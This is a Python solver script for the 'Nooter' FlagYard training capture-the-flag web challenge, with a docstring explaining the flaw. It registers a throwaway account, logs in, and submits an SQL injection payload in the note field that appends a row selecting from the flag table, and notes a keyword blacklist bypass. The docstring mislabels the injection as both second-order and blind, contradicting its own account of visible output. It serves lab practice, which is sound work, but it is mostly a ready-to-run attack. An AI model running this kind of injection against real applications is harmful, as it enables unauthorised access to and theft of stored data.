#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NOOTER  -  FlagYard Web solver

Nooter (FlagYard Training Labs, Easy / SAFCSP) - "Just another note taking app :)".

Flask + SQLite. Logged-in users POST / with a `note` field. The INSERT is
built with string formatting (only username is parameterized):

    INSERT INTO notes(username, notes) VALUES(?,'%s')   % note

=> second-order SQL injection in the note field. Unlike 'feedback', after
saving the note the app immediately loads the user's notes and RENDERS them:

    notes = db.select("SELECT notes FROM notes WHERE username = ?", ...)
    render_template('home.html', ..., notes=notes)

So the output is VISIBLE and one injection is enough: close the string slot,
add a second VALUES row for our own username populated with the flag row:

    note = "x'), ('u', (SELECT flag FROM flag)) -- "

    INSERT INTO notes(username, notes)
    VALUES('u','x'), ('u', (SELECT flag FROM flag)) -- ')

The reload then lists our notes, including the flag note -> flag is rendered
straight onto the page.

Blacklist (exec/load/blob/glob/union/join/like/match/regexp/in/limit/order/
hex/where) is bypassed - the payload uses only select/flag.

Verified live: the tool recovered the flag via the notes blind SQLi
(`FlagY{d695ef54fc9bd8ca664193eb485c4721}`) and saves it to
`flag_from_nooter.txt`.
"""
from __future__ import annotations

import http.client
import random
import re
import sys
import time
import urllib.parse
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def bar(frac):
    w = 20
    f = max(0.0, min(1.0, frac))
    full = int(round(f * w))
    return "[%s%s] %5.1f%%" % ("\u2588" * full, "\u2591" * (w - full), f * 100.0)

def step(msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s" % (C.BOLD + color + icon + " ",
                             C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(msg):
    step(msg, icon="\u2713", color=C.GREEN)

def tick(frac, msg):
    """single moving progress line (updates in place via carriage return)."""
    line = ("%s%s %s %s%s%s" %
            (C.BOLD + C.YELLOW + "\u25b6 ",
             C.CYAN + bar(frac) + C.RESET,
             C.DIM, C.BOLD, msg, C.RESET))
    sys.stdout.write("\r  " + line + "   ")
    sys.stdout.flush()

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("N O O T E R   S O L V E R",
              "notes SQLi -> header row with (SELECT flag FROM flag)"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono):
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (flag, C.BOLD + C.GREEN, "")])
    _row([(" " * 10, "", ""), ("elapsed %.1f s" % chrono, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith("http"):
        return argv[1].strip()
    url = input("  Enter the Nooter challenge URL: ").strip()
    if not url:
        raise RuntimeError("no URL provided")
    return url

def parse_host(url):
    url = re.sub(r"^https?://", "", url).rstrip("/")
    if url.startswith("//"):
        url = url[2:]
    m = re.match(r"^(.*?)(:\d+)?$", url)
    host = m.group(1)
    port = int(m.group(2).lstrip(":")) if m.group(2) else 80
    return host, port

def post(host, port, path, data, cookie=None):
    body = urllib.parse.urlencode(data).encode("utf-8")
    c = http.client.HTTPConnection(host, port, timeout=30)
    h = {"Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": "Mozilla/5.0"}
    if cookie:
        h["Cookie"] = cookie
    c.request("POST", path, body=body, headers=h)
    r = c.getresponse()
    d = r.read()
    sc = r.getheader("Set-Cookie") or ""
    c.close()
    return r.status, d, sc

def read_flag(raw):
    if isinstance(raw, bytes):
        raw = raw.decode("utf-8", "replace")
    m = re.search(r"(FlagY\{[^}]+\})", raw)
    return m.group(1) if m else None

def main():
    t0 = time.time()
    enable_vt()
    banner()

    try:
        url = ask_target(sys.argv)
    except Exception:
        fail("no challenge URL given")
        return
    host, port = parse_host(url)
    step("target host %s:%d" % (host, port))

    # ------------- register a throwaway account ---------------------------
    user = "n%d" % random.randint(100000, 999999)
    pw = "p%d" % random.randint(100000, 999999)
    st, d, _ = post(host, port, "/register", {"username": user, "password": pw})
    if st != 200:
        fail("register failed or disabled")
        return
    ok("registered account %s" % user)

    # ------------- login -> session cookie ---------------------------------
    st, d, sc = post(host, port, "/login", {"username": user, "password": pw})
    cookie = sc.split(";")[0] if sc else ""
    if not cookie:
        fail("no session cookie after login")
        return
    ok("logged in (session cookie acquired)")

    # ------------- one-shot SQLi: second VALUES row reads flag -------------
    step("injecting a note that selects from the flag table")
    note = "x'), ('%s', (SELECT flag FROM flag)) -- " % user
    st, d, _ = post(host, port, "/", {"note": note}, cookie=cookie)
    flag = read_flag(d)
    if not flag:
        fail("no flag rendered after injection: HTTP %d" % st)
        fail("(the app may now block the payload - re-run the solver)")
        return
    tick(0.85, "flag note rendered on the home page")
    print()
    ok("FLAG = %s" % flag)

    big_flag(flag, time.time() - t0)
    outp = Path(__file__).resolve().parent / "flag_from_nooter.txt"
    outp.write_text(flag + "\n", encoding="utf-8")
    print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))

if __name__ == "__main__":
    main()